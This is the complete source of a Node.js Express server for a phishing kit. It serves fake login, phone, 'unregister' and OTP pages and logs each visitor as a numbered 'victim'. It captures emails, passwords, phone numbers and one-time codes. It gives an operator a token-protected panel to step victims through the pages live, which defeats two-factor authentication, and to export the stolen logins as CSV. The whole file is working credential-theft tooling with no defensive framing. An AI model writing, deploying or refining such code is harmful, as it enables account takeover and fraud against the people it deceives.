/* ----------  DEPENDENCIES  ---------- */
const express = require('express');
const cors    = require('cors');
const crypto  = require('crypto');
const fs      = require('fs');

/* ----------  CONFIG  ---------- */
const PANEL_USER     = process.env.PANEL_USER  || 'admin';
const PANEL_PASS     = process.env.PANEL_PASS  || 'changeme';

const app  = express();
const PORT = process.env.PORT || 3000;

console.log('Starting server...');
console.log('Panel user:', PANEL_USER);

/* ----------  STATE  ---------- */
const sessionsMap     = new Map();
const sessionActivity = new Map();
const auditLog        = [];
let victimCounter     = 0;
let successfulLogins  = 0;
let currentDomain     = '';

// Token-based auth (token -> {username, created})
const authTokens = new Map();

/* ----------  MIDDLEWARE  ---------- */
app.set('trust proxy', 1);
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

/* ----------  AUTH HELPER  ---------- */
function getAuthToken(req) {
  // Check multiple sources: header, query param, body
  const header = req.headers['x-auth-token'] || req.headers['authorization']?.replace('Bearer ', '');
  const query = req.query.token;
  const body = req.body?.token;
  return header || query || body || null;
}

function checkAuth(req, res, next) {
  const token = getAuthToken(req);
  if (token && authTokens.has(token)) {
    const auth = authTokens.get(token);
    // Check if token expired (24 hours)
    if (Date.now() - auth.created > 24 * 60 * 60 * 1000) {
      authTokens.delete(token);
      req.isAuthed = false;
    } else {
      req.isAuthed = true;
      req.username = auth.username;
      req.token = token;
    }
  } else {
    req.isAuthed = false;
  }
  next();
}

/* ----------  STATIC ROUTES  ---------- */
app.use(express.static(__dirname));

app.get('/',             (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/verify.html',  (req, res) => res.sendFile(__dirname + '/verify.html'));
app.get('/unregister.html', (req, res) => res.sendFile(__dirname + '/unregister.html'));
app.get('/otp.html',     (req, res) => res.sendFile(__dirname + '/otp.html'));
app.get('/success.html', (req, res) => res.sendFile(__dirname + '/success.html'));

/* ----------  PANEL ROUTES  ---------- */
app.get('/panel', checkAuth, (req, res) => {
  if (req.isAuthed) {
    // Read and inject token
    let html = fs.readFileSync(__dirname + '/_panel.html', 'utf8');
    // Replace the placeholder with actual token
    html = html.replace('const SERVER_TOKEN = null;', `const SERVER_TOKEN = '${req.token}';`);
    return res.send(html);
  }
  res.sendFile(__dirname + '/access.html');
});

app.post('/panel/login', (req, res) => {
  const { user, pw } = req.body;
  console.log('Login attempt:', user, 'Match:', user === PANEL_USER && pw === PANEL_PASS);
  
  if (user === PANEL_USER && pw === PANEL_PASS) {
    const token = crypto.randomBytes(16).toString('hex');
    authTokens.set(token, { username: user, created: Date.now() });
    console.log('Login success, token:', token);
    // Redirect with token
    return res.redirect('/panel?token=' + token);
  }
  
  res.redirect('/panel?fail=1');
});

app.get('/panel/logout', (req, res) => {
  const token = getAuthToken(req);
  if (token) authTokens.delete(token);
  res.redirect('/panel');
});

/* ----------  DOMAIN HELPER  ---------- */
app.use((req, res, next) => {
  const host  = req.headers.host || req.hostname;
  const proto = req.headers['x-forwarded-proto'] || req.protocol;
  currentDomain = host.includes('localhost') ? `http://localhost:${PORT}` : `${proto}://${host}`;
  next();
});

/* ----------  UA PARSER  ---------- */
function uaParser(ua) {
  const u = { browser: {}, os: {} };
  if (/Windows NT/.test(ua)) u.os.name = 'Windows';
  if (/Android/.test(ua)) u.os.name = 'Android';
  if (/iPhone|iPad/.test(ua)) u.os.name = 'iOS';
  if (/Linux/.test(ua) && !/Android/.test(ua)) u.os.name = 'Linux';
  if (/Chrome\/(\d+)/.test(ua)) u.browser.name = 'Chrome';
  if (/Firefox\/(\d+)/.test(ua)) u.browser.name = 'Firefox';
  if (/Safari\/(\d+)/.test(ua) && !/Chrome/.test(ua)) u.browser.name = 'Safari';
  return u;
}

/* ----------  SESSION HELPERS  ---------- */
function getSessionHeader(v) {
  if (v.page === 'success') return `APPROVED`;
  if (v.page === 'index.html') return v.entered ? `CREDENTIALS` : 'WAITING';
  if (v.page === 'verify.html') return v.phone ? `PHONE` : `WAITING`;
  if (v.page === 'unregister.html') return v.unregisterClicked ? `UNREGISTERED` : `WAITING`;
  if (v.page === 'otp.html') return v.otp ? `OTP` : `WAITING`;
  return `WAITING`;
}

/* ----------  VICTIM API  ---------- */
app.post('/api/session', (req, res) => {
  const sid = crypto.randomUUID();
  const ip  = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress;
  const ua  = req.headers['user-agent'] || 'n/a';
  
  victimCounter++;
  const victim = {
    sid, ip, ua, dateStr: new Date().toLocaleString(),
    entered: false, email: '', password: '', phone: '', otp: '',
    page: 'index.html',
    platform: uaParser(ua).os?.name || 'n/a',
    browser: uaParser(ua).browser?.name || 'n/a',
    unregisterClicked: false,
    status: 'loaded', victimNum: victimCounter,
    activityLog: [{ time: Date.now(), action: 'CONNECTED', detail: 'Visitor connected' }]
  };
  
  sessionsMap.set(sid, victim);
  sessionActivity.set(sid, Date.now());
  res.json({ sid });
});

app.post('/api/ping', (req, res) => {
  const { sid } = req.body;
  if (sid && sessionsMap.has(sid)) {
    sessionActivity.set(sid, Date.now());
    return res.sendStatus(200);
  }
  res.sendStatus(404);
});

app.post('/api/login', (req, res) => {
  const { sid, email, password } = req.body;
  if (!email?.trim() || !password?.trim()) return res.sendStatus(400);
  
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.entered = true; 
  v.email = email; 
  v.password = password;
  v.status = 'wait';
  v.activityLog.push({ time: Date.now(), action: 'CREDENTIALS', detail: email });
  
  auditLog.push({ t: Date.now(), victimN: v.victimNum, sid, email, password, ip: v.ip, ua: v.ua });
  res.sendStatus(200);
});

app.post('/api/verify', (req, res) => {
  const { sid, phone } = req.body;
  if (!phone?.trim()) return res.sendStatus(400);
  
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.phone = phone;
  v.activityLog.push({ time: Date.now(), action: 'PHONE', detail: phone });
  
  const entry = auditLog.find(e => e.sid === sid);
  if (entry) entry.phone = phone;
  res.sendStatus(200);
});

app.post('/api/unregister', (req, res) => {
  const { sid } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.unregisterClicked = true;
  v.activityLog.push({ time: Date.now(), action: 'UNREGISTER', detail: 'Clicked' });
  res.sendStatus(200);
});

app.post('/api/otp', (req, res) => {
  const { sid, otp } = req.body;
  if (!otp?.trim()) return res.sendStatus(400);
  
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.otp = otp;
  v.activityLog.push({ time: Date.now(), action: 'OTP', detail: otp });
  
  const entry = auditLog.find(e => e.sid === sid);
  if (entry) entry.otp = otp;
  res.sendStatus(200);
});

app.post('/api/page', (req, res) => {
  const { sid, page } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.sendStatus(404);
  
  v.page = page;
  v.activityLog.push({ time: Date.now(), action: 'PAGE', detail: page });
  res.sendStatus(200);
});

app.get('/api/status/:sid', (req, res) => {
  const v = sessionsMap.get(req.params.sid);
  res.json({ status: v ? v.status : 'gone' });
});

/* ----------  PANEL API  ---------- */
app.get('/api/panel', checkAuth, (req, res) => {
  if (!req.isAuthed) return res.status(401).json({ error: 'Not authenticated' });
  
  const list = Array.from(sessionsMap.values()).map(v => ({
    sid: v.sid, victimNum: v.victimNum, header: getSessionHeader(v), page: v.page, status: v.status,
    email: v.email, password: v.password, phone: v.phone, otp: v.otp,
    ip: v.ip, platform: v.platform, browser: v.browser, ua: v.ua, dateStr: v.dateStr,
    entered: v.entered, unregisterClicked: v.unregisterClicked,
    activityLog: v.activityLog
  }));
  
  res.json({
    domain: currentDomain,
    username: req.username || PANEL_USER,
    totalVictims: victimCounter,
    active: list.length,
    waiting: list.filter(x => x.status === 'wait').length,
    success: successfulLogins,
    sessions: list,
    logs: auditLog.slice(-50).reverse(),
    token: req.token
  });
});

app.post('/api/panel', checkAuth, (req, res) => {
  if (!req.isAuthed) return res.status(401).json({ error: 'Not authenticated' });
  
  const { action, sid } = req.body;
  const v = sessionsMap.get(sid);
  if (!v) return res.status(404).json({ ok: false });

  switch (action) {
    case 'redo':
      if (v.page === 'index.html') {
        v.status = 'redo'; v.entered = false; v.email = ''; v.password = '';
      } else if (v.page === 'verify.html') {
        v.status = 'redo'; v.phone = '';
      } else if (v.page === 'otp.html') {
        v.status = 'redo'; v.otp = '';
      }
      break;
    case 'cont':
      v.status = 'ok';
      if (v.page === 'index.html') v.page = 'verify.html';
      else if (v.page === 'verify.html') v.page = 'unregister.html';
      else if (v.page === 'unregister.html') v.page = 'otp.html';
      else if (v.page === 'otp.html') { v.page = 'success'; successfulLogins++; }
      break;
    case 'delete':
      sessionsMap.delete(sid);
      sessionActivity.delete(sid);
      break;
  }
  res.json({ ok: true });
});

app.get('/api/export', checkAuth, (req, res) => {
  if (!req.isAuthed) return res.status(401).send('Unauthorized');
  
  const successes = auditLog
    .filter(r => r.phone && r.otp)
    .map(r => [r.victimN, r.email, r.password, r.phone, r.otp, r.ip, r.ua, new Date(r.t).toISOString()]);
  
  const csv = [
    ['Victim#','Email','Password','Phone','OTP','IP','UA','Timestamp'],
    ...successes
  ].map(r => r.map(v => `"${v}"`).join(',')).join('\n');
  
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', 'attachment; filename="logins.csv"');
  res.send(csv);
});

/* ----------  START  ---------- */
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  currentDomain = process.env.RAILWAY_STATIC_URL || `http://localhost:${PORT}`;
});
